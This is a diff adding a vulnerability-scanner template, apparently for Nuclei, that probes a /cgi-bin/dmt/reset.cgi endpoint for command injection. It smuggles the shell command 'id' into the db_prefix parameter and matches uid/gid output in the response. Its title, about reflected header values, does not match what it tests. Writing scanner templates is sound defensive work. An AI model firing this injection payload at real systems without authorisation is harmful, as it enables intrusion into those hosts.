@@ -1,0 +1,28 @@
+id: manoo
+
+info:
+  name: Looking for reflected values from request headers
+  author: panch0r3d
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /cgi-bin/dmt/reset.cgi?db_prefix=%26id%26 HTTP/1.1
+        Host: {{Hostname}}
+        
+
+    matchers-condition: and 
+    matchers:
+      - type: regex
+        regex:
+          - "uid=([0-9 (a-z)]+)gid=([0-9 (a-z)]+)groups=([0-9 (a-z)]+)"
+        part: body
+
+      - type: word
+        part: body
+        words:
+          - "file prefix"
+      - type: status
+        status:
+          -  200
